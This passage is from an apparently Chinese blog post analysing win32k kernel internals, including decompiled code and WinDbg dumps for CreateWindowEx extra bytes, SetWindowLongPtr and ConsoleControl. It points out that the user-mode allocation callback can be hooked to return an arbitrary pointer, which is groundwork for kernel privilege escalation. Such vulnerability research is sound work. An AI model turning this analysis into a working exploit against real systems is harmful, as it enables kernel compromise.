class="number">16</span>) | <span class="number">5u</span>);</span><br><span class="line">    pTagWND[<span class="number">5</span>] = (<span class="type">const</span> <span class="type">void</span> *)pTagWNDk;        <span class="comment">// pTagWND-&gt;pTagWNDk = pTagWNDk</span></span><br><span class="line">    <span class="keyword">if</span> ( !pTagWNDk )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">HMFreeUserOrIsolatedType</span>(someAttribute, type, pTagWND);</span><br><span class="line">      <span class="keyword">goto</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LockObjectAssignment</span>(pTagWND + <span class="number">3</span>, pdesk);</span><br><span class="line">    pTagWNDkAddr = (<span class="type">void</span> *)pTagWND[<span class="number">5</span>];</span><br><span class="line">    pTagWND[<span class="number">4</span>] = pTagWND;</span><br><span class="line">    pTagWND[<span class="number">6</span>] = (<span class="type">char</span> *)pTagWNDkAddr - *(_QWORD *)(pdesk + <span class="number">0x80</span>);<span class="comment">// TagWNDkOffset = pTagWNDkAddr - DesktopBaseAddr</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">hWND = (<span class="type">int</span>)v15 | (<span class="type">unsigned</span> __int64)(*(<span class="type">unsigned</span> __int16 *)((<span class="type">char</span> *)qword_1C0221768</span><br><span class="line">                                                           + v15 * (<span class="type">unsigned</span> <span class="type">int</span>)dword_1C0221770</span><br><span class="line">                                                           + <span class="number">26</span>) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">*pTagWND = (<span class="type">const</span> <span class="type">void</span> *)hWND;</span><br><span class="line"><span class="keyword">if</span> ( *(_DWORD *)((<span class="type">char</span> *)&amp;gahti + v38 + <span class="number">16</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  pTagWNDk = (<span class="type">unsigned</span> __int64 *)pTagWND[<span class="number">5</span>];</span><br><span class="line">  *pTagWNDk = hWND;</span><br><span class="line">  pTagWNDk[<span class="number">1</span>] = (<span class="type">unsigned</span> __int64)pTagWND[<span class="number">6</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的内存布局：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dq rsi <span class="comment">// pTagWND</span></span><br><span class="line">fffff982`<span class="number">036</span>ef7e0  <span class="number">00000000</span>`<span class="number">000703</span>dc <span class="number">00000000</span>`<span class="number">00000000</span> <span class="comment">// handle | 0</span></span><br><span class="line">fffff982`<span class="number">036</span>ef7f0  fffff982`<span class="number">007e99</span>a0 ffffc58d`ffdfd890</span><br><span class="line">fffff982`<span class="number">036</span>ef800  fffff982`<span class="number">036</span>ef7e0 fffff982`<span class="number">01243</span>af0 <span class="comment">// self | pTagWNDk</span></span><br><span class="line">fffff982`<span class="number">036</span>ef810  <span class="number">00000000</span>`<span class="number">00043</span>af0 <span class="number">00000000</span>`<span class="number">00000000</span> <span class="comment">// TagWNDkOffset | 0</span></span><br><span class="line">fffff982`<span class="number">036</span>ef820  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef830  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef840  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef850  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq fffff982`<span class="number">01243</span>af0 <span class="comment">// pTagWNDk</span></span><br><span class="line">fffff982`<span class="number">01243</span>af0  <span class="number">00000000</span>`<span class="number">000703</span>dc <span class="number">00000000</span>`<span class="number">00043</span>af0 <span class="comment">// handle | TagWNDkOffset</span></span><br><span class="line">fffff982`<span class="number">01243b</span>00  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>10  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>20  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>30  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>40  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>50  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>60  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>然后回到 <code>pTagWNDk-&gt;pExtraBytes</code> 赋值的地方，<code>tagWND::RedirectedFieldcbwndExtra&lt;int&gt;::operator!=</code> 的实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall tagWND::RedirectedFieldcbwndExtra&lt;<span class="type">int</span>&gt;::<span class="keyword">operator</span>!=(__int64 a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_DWORD *)(*(_QWORD *)(a1 - <span class="number">0x89</span>) + <span class="number">0xC8</span>i64) != *a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而我们输入的第一个参数为 <code>(char *)pTagWND + 0xB1</code> ，第二个参数为 <code>0</code> ，也就是说最后变成了 ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pTagWNDk + <span class="number">0xC8</span> != <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>而这个值经过调试就是我们前面所设定的 <code>cbWndExtra</code> 值，为 <code>0xab</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dq rcx<span class="number">-0x89</span></span><br><span class="line">fffff982`<span class="number">036</span>ef808  fffff982`<span class="number">01243</span>af0 <span class="number">00000000</span>`<span class="number">00043</span>af0</span><br><span class="line">fffff982`<span class="number">036</span>ef818  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef828  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef838  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef848  fffff982`<span class="number">00830</span>a80 <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef858  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef868  fffff982`<span class="number">03703240</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">036</span>ef878  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>: kd&gt; dq fffff982`<span class="number">01243</span>af0+<span class="number">0xc8</span></span><br><span class="line">fffff982`<span class="number">01243b</span>b8  <span class="number">00000000</span>`<span class="number">000000</span>ab <span class="number">00000000</span>`<span class="number">002</span>d02fb</span><br><span class="line">fffff982`<span class="number">01243b</span>c8  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>d8  <span class="number">00000001</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243b</span>e8  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00010001</span></span><br><span class="line">fffff982`<span class="number">01243b</span>f8  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243</span>c08  <span class="number">00000090</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00006010</span></span><br><span class="line">fffff982`<span class="number">01243</span>c18  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">fffff982`<span class="number">01243</span>c28  <span class="number">00000000</span>`<span class="number">00000000</span> f1f26acb`<span class="number">6</span>d496ee5</span><br></pre></td></tr></table></figure>

<p>那么它便会调用 <code>xxxClientAllocWindowClassExtraBytes(cbWndExtra)</code>   并将 <code>pTagWNDk-&gt;pExtraBytes</code> 设置为返回值的内容，下面我们来看一看 <code>xxxClientAllocWindowClassExtraBytes</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">volatile</span> <span class="type">void</span> *__fastcall <span class="title">xxxClientAllocWindowClassExtraBytes</span><span class="params">(SIZE_T Length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( gdwInAtomicOperation &amp;&amp; (gdwExtraInstrumentations &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">KeBugCheckEx</span>(<span class="number">0x160</span>u, gdwInAtomicOperation, <span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64);</span><br><span class="line">  ReleaseAndReacquirePerObjectLocks::<span class="built_in">ReleaseAndReacquirePerObjectLocks</span>((ReleaseAndReacquirePerObjectLocks *)&amp;v10);</span><br><span class="line">  LeaveEnterCritProperDisposition::<span class="built_in">LeaveEnterCritProperDisposition</span>((LeaveEnterCritProperDisposition *)&amp;v9);</span><br><span class="line">  <span class="built_in">EtwTraceBeginCallback</span>(<span class="number">123</span>i64);</span><br><span class="line">  NTSTATUS = <span class="built_in">KeUserModeCallback</span>(<span class="number">123</span>i64, &amp;length, <span class="number">4</span>i64, &amp;OutputBuffer, &amp;OutputLength);</span><br><span class="line">  <span class="built_in">EtwTraceEndCallback</span>(<span class="number">123</span>i64);</span><br><span class="line">  LeaveEnterCritProperDisposition::~<span class="built_in">LeaveEnterCritProperDisposition</span>((LeaveEnterCritProperDisposition *)&amp;v9);</span><br><span class="line">  ReleaseAndReacquirePerObjectLocks::~<span class="built_in">ReleaseAndReacquirePerObjectLocks</span>((ReleaseAndReacquirePerObjectLocks *)&amp;v10);</span><br><span class="line">  <span class="keyword">if</span> ( NTSTATUS &lt; <span class="number">0</span> || OutputLength != <span class="number">0x18</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( OutputBuffer + <span class="number">8</span> &lt; OutputBuffer || OutputBuffer + <span class="number">8</span> &gt; MmUserProbeAddress )</span><br><span class="line">    OutputBuffer = (__int64 *)MmUserProbeAddress;</span><br><span class="line">  v5 = <span class="built_in">PsGetCurrentProcessWow64Process</span>();</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(OutputBuffer, length, v5 != <span class="number">0</span> ? <span class="number">1</span> : <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> OutputBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它会使用 <code>KeUserModeCallback</code> 回调 <code>PEB.KernelCallbackTable</code> 表中第 <code>123</code> 项用户态函数（该函数为 <code>user32!_xxxClientAllocWindowClassExtraBytes</code> ****），传入的参数为 <code>length</code> ，并判断返回的 <code>OutputLength</code> 是否为 <code>0x18</code> 且 <code>NTSTATUS</code> 为成功。随后检查了返回的 <code>OutputBuffer</code> 和 <code>OutputBuffer + length</code> 是否都在用户态地址范围（小于 <code>0x7fffffff0000</code> ）。如果检查正确则最终返回 <code>OutputBuffer</code> 。</p>
<p><code>user32!_xxxClientAllocWindowClassExtraBytes</code> 函数的内容如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __fastcall _xxxClientAllocWindowClassExtraBytes(<span class="type">unsigned</span> <span class="type">int</span> *pSize)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  Result = <span class="built_in">RtlAllocateHeap</span>(pUserHeap, <span class="number">8u</span>, *pSize);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">NtCallbackReturn</span>(&amp;Result, <span class="number">0x18</span>u, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其通过 <code>RtlAllocateHeap</code> 分配用户空间的堆，大小为 <code>size</code> ，同时使用 <code>NtCallbackReturn</code> 返回分配的结果。</p>
<p>最终 <code>xxxCreateWindowEx</code> 使用 <code>xxxClientAllocWindowClassExtraBytes</code> 所返回的结果（也就是用户空间的堆指针）初始化了 <code>pTagWNDk-&gt;pExtraBytes</code> 的值，也就是说普通情况下 <code>pTagWNDk-&gt;pExtraBytes</code> 的值会是一个用户态空间的堆指针。</p>
<p>需要注意的是，这里的 <code>user32!_xxxClientAllocWindowClassExtraBytes</code> 是用户态的函数，我们可以对其进行 <code>hook</code> 并返回任意在用户态空间地址的值，其也会直接通过检查并存放至 <code>pTagWNDk-&gt;pExtraBytes</code> 处。</p>
<h2 id="SetWindowLongPtr流程"><a href="#SetWindowLongPtr流程" class="headerlink" title="SetWindowLongPtr流程"></a>SetWindowLongPtr流程</h2><p>首先在上面的实例中添加如下代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, <span class="number">0x34</span>, <span class="number">0xdeadbeef</span>);</span><br></pre></td></tr></table></figure>

<p>然后就可以开始调试了</p>
<p><code>SetWindowLongPtr</code> 最终会调用到 <code>xxxSetWindowLongPtr</code> ，栈回溯如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; k</span><br><span class="line"> # Child-SP          RetAddr               Call Site</span><br><span class="line"><span class="number">00</span> ffffd58e`fb67da98 fffff9d4`d7a9d4c7     win32kfull!xxxSetWindowLongPtr</span><br><span class="line"><span class="number">01</span> ffffd58e`fb67daa0 fffff805`<span class="number">835</span>cde95     win32kfull!NtUserSetWindowLongPtr+<span class="number">0xc7</span></span><br><span class="line"><span class="number">02</span> ffffd58e`fb67db00 <span class="number">00007f</span>fb`e82bad64     nt!KiSystemServiceCopyEnd+<span class="number">0x25</span></span><br><span class="line"><span class="number">03</span> <span class="number">000000e1</span>`cdfbfc78 <span class="number">00007f</span>fb`eaac20f1     win32u!NtUserSetWindowLongPtr+<span class="number">0x14</span></span><br><span class="line">*** WARNING: Unable to verify checksum <span class="keyword">for</span> test.exe</span><br><span class="line"><span class="number">04</span> <span class="number">000000e1</span>`cdfbfc80 <span class="number">00007f</span>f7`aecf1158     USER32!_SetWindowLongPtr+<span class="number">0x111</span></span><br><span class="line"><span class="number">05</span> (Inline Function) --------`--------     test!InitInstance+<span class="number">0x6b</span> [D:\kernel\Win32K\poc\test\test\test.cpp @ <span class="number">108</span>] </span><br><span class="line"><span class="number">06</span> <span class="number">000000e1</span>`cdfbfcc0 <span class="number">00000000</span>`<span class="number">00140302</span>     test!wWinMain+<span class="number">0x158</span> [D:\kernel\Win32K\poc\test\test\test.cpp @ <span class="number">36</span>] </span><br><span class="line"><span class="number">07</span> <span class="number">000000e1</span>`cdfbfcc8 <span class="number">00007f</span>f7`aecf5650     <span class="number">0x140302</span></span><br><span class="line"><span class="number">08</span> <span class="number">000000e1</span>`cdfbfcd0 <span class="number">00000000</span>`<span class="number">0000000</span>a     test!szWindowClass</span><br><span class="line"><span class="number">09</span> <span class="number">000000e1</span>`cdfbfcd8 <span class="number">00007f</span>f7`aecf0000     <span class="number">0xa</span></span><br><span class="line"><span class="number">0</span>a <span class="number">000000e1</span>`cdfbfce0 <span class="number">00000000</span>`<span class="number">80000000</span>     test!__ImageBase</span><br><span class="line"><span class="number">0b</span> <span class="number">000000e1</span>`cdfbfce8 <span class="number">00007f</span>fb`<span class="number">00000000</span>     <span class="number">0x80000000</span></span><br><span class="line"><span class="number">0</span>c <span class="number">000000e1</span>`cdfbfcf0 <span class="number">00000000</span>`<span class="number">80000000</span>     <span class="number">0x00007ffb</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>d <span class="number">000000e1</span>`cdfbfcf8 <span class="number">00000000</span>`<span class="number">00000000</span>     <span class="number">0x80000000</span></span><br></pre></td></tr></table></figure>

<p><code>xxxSetWindowLongPtr</code> 的主要逻辑如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">xxxSetWindowLongPtr</span><span class="params">(<span class="keyword">struct</span> tagWND *pTagWND, <span class="type">int</span> index, __int64 value, __int64 zero, <span class="type">int</span> one)</span></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	pTagWNDk = *((_QWORD *)pTagWND + <span class="number">5</span>);</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)index &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    zero = *(<span class="type">unsigned</span> <span class="type">int</span> *)(pTagWNDk + <span class="number">0xFC</span>); <span class="comment">// 0</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> <span class="type">int</span>)index + <span class="number">8</span> &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)(zero + *(_DWORD *)(pTagWNDk_0 + <span class="number">0xC8</span>)) )<span class="comment">// index + 8 &lt;= 0 + cbWndExtra</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">				<span class="keyword">if</span> ( (<span class="type">int</span>)index + <span class="number">8</span>i64 &lt;= zero )    <span class="comment">// 负数</span></span><br><span class="line">        &#123;</span><br><span class="line">          v28 = *((_QWORD *)pTagWND + <span class="number">0x23</span>);</span><br><span class="line">          *(_QWORD *)(index + v28) = value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (*(_DWORD *)(pTagWNDk + <span class="number">0xE8</span>) &amp; <span class="number">0x800</span>) != <span class="number">0</span> )<span class="comment">// flags</span></span><br><span class="line">            targetAddr = (__int64 *)(*(_QWORD *)(pTagWNDk + <span class="number">0x128</span>)</span><br><span class="line">                                     + index</span><br><span class="line">                                     + *(_QWORD *)(*((_QWORD *)pTagWND + <span class="number">3</span>) + <span class="number">0x80</span>i64));<span class="comment">// pTagWNDk-&gt;pExtraBytes + index + DesktopBaseAddr</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            targetAddr = (__int64 *)(*(_QWORD *)(pTagWNDk + <span class="number">0x128</span>) + index);<span class="comment">// pTagWNDk-&gt;pExtraBytes + index</span></span><br><span class="line">          *targetAddr = value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">      &#125;</span><br><span class="line">		...</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其会对 <code>index</code> 的范围进行检查，随后检查 <code>(pTagWNDk + 0xE8) &amp; 0x800</code> 的标志位是否设置，并分两种情况写值：</p>
<ul>
<li>如果设置了，则 pTagWNDk-&gt;pExtraBytes + index + DesktopBaseAddr &#x3D; value</li>
<li>如果没设置，则 pTagWNDk-&gt;pExtraBytes + index &#x3D; value</li>
</ul>
<p>在正常情况下，我们是没有设置该标志位的，那么 <code>pTagWNDk-&gt;pExtraBytes</code> 中存储的就是用户态空间的堆地址，其设置值的方式也就是在用户态堆地址的偏移处写值；而如果设置了该标志位，则是从内核态的桌面堆基地址开始取偏移值并写入。</p>
<p><code>GetWindowLongPtr</code> 的逻辑类似，这里不再分析。</p>
<h2 id="ConsoleControl流程"><a href="#ConsoleControl流程" class="headerlink" title="ConsoleControl流程"></a>ConsoleControl流程</h2><p><code>ConsoleControl</code> 位于 <code>user32.dll</code> 中，是一个未公开的函数。最终该函数会调用到 <code>win32kfull!xxxConsoleControl</code> ，逻辑如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">xxxConsoleControl</span><span class="params">(<span class="type">int</span> funcIndex, <span class="keyword">struct</span> _CONSOLE_PROCESS_INFO *pParam, <span class="type">int</span> paramLength)</span></span>&#123;</span><br><span class="line">		...</span><br><span class="line">		<span class="keyword">if</span> ( funcIndexSubFive != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC0000003</span>;</span><br><span class="line">    <span class="keyword">if</span> ( paramLength != <span class="number">16</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xC000000D</span>;</span><br><span class="line">    ptagWND = <span class="built_in">ValidateHwnd</span>(*(_QWORD *)pParam);</span><br><span class="line">    <span class="keyword">if</span> ( !ptagWND )</span><br><span class="line">      <span class="keyword">return</span> errorCode;</span><br><span class="line">    ptagWNDk = ptagWND + <span class="number">0x28</span>;</span><br><span class="line">		...</span><br><span class="line">		<span class="keyword">if</span> ( (*(_DWORD *)(*(_QWORD *)ptagWNDk + <span class="number">0xE8</span>i64) &amp; <span class="number">0x800</span>) != <span class="number">0</span> )<span class="comment">// flags</span></span><br><span class="line">    &#123;</span><br><span class="line">      buffer = (_DWORD *)(*(_QWORD *)(ptagWNDk + <span class="number">0x128</span>) + *(_QWORD *)(*(_QWORD *)(ptagWND + <span class="number">0x18</span>) + <span class="number">0x80</span>i64));<span class="comment">// buffer = pTagWNDk-&gt;pExtraBytes + DesktopBaseAddr</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      buffer = (_DWORD *)<span class="built_in">DesktopAlloc</span>(*(_QWORD *)(ptagWND + <span class="number">0x18</span>), *(<span class="type">unsigned</span> <span class="type">int</span> *)(ptagWNDk + <span class="number">0xC8</span>), <span class="number">0</span>i64);<span class="comment">// buffer = DesktopAlloc(*(pTagWND+0x18),cbWndExtra)</span></span><br><span class="line">      <span class="keyword">if</span> ( !buffer )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0xC0000017</span>;</span><br><span class="line">end:</span><br><span class="line">        <span class="built_in">ThreadUnlock1</span>();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(*(_QWORD *)ptagWNDk + <span class="number">0x128</span>i64) )<span class="comment">// pTagWNDk-&gt;pExtraBytes</span></span><br><span class="line">      &#123;</span><br><span class="line">        handle = <span class="built_in">PsGetCurrentProcess</span>(v21);</span><br><span class="line">        cbWndExtra = *(_DWORD *)(*(_QWORD *)ptagWNDk + <span class="number">0xC8</span>i64);</span><br><span class="line">        ExtraBytes = *(<span class="type">const</span> <span class="type">void</span> **)(*(_QWORD *)ptagWNDk + <span class="number">0x128</span>i64);</span><br><span class="line">        <span class="built_in">memmove</span>(buffer, ExtraBytes, cbWndExtra);</span><br><span class="line">        <span class="keyword">if</span> ( (*(_DWORD *)(handle + <span class="number">0x30C</span>) &amp; <span class="number">0x40000008</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="built_in">xxxClientFreeWindowClassExtraBytes</span>(ptagWND_0, *(_QWORD *)(*(_QWORD *)(ptagWND + <span class="number">0x28</span>) + <span class="number">0x128</span>i64));<span class="comment">// free</span></span><br><span class="line">      &#125;</span><br><span class="line">      *(_QWORD *)(*(_QWORD *)ptagWNDk + <span class="number">0x128</span>i64) = (<span class="type">char</span> *)buffer</span><br><span class="line">                                                  - *(_QWORD *)(*(_QWORD *)(ptagWND + <span class="number">0x18</span>) + <span class="number">0x80</span>i64);<span class="comment">// pTagWNDk-&gt;pExtraBytes = bufferAddr - DesktopBaseAddr</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buffer )</span><br><span class="line">    &#123;</span><br><span class="line">      *buffer = *((_DWORD *)pParam + <span class="number">2</span>);</span><br><span class="line">      buffer[<span class="number">1</span>] = *((_DWORD *)pParam + <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)ptagWNDk + <span class="number">0xE8</span>i64) |= <span class="number">0x800</span>u;<span class="comment">// flags set</span></span><br><span class="line">    <span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们所输入的 <code>funcIndex</code> 为 <code>6</code> 且 <code>param</code> 长度为 <code>0x10</code> 的时候，会检查 <code>flags</code> 的设置，并进行如下操作：</p>
<ul>
<li>如果设置了，则 buffer &#x3D; pTagWNDk-&gt;pExtraBytes + DesktopBaseAddr</li>
<li>如果没设置，则 buffer &#x3D; DesktopAlloc(*(pTagWND+0x18),cbWndExtra)</li>
</ul>
<p>也就是如果设置了则证明已经有了内核态的 <code>buffer</code> ，直接取出；否则使用 <code>DesktopAlloc</code> 分配新的 <code>buffer</code> 。然后拷贝原先的 <code>ExtraBytes</code> 到该 <code>buffer</code> ，并存储 <code>bufferAddr - DesktopBaseAddr</code> 即 <code>buffer</code> 的地址到桌面堆基地址的偏移到 <code>pTagWNDk-&gt;pExtraBytes</code> ，最后将 <code>flags</code> 设置为 <code>1</code> 结束。</p>
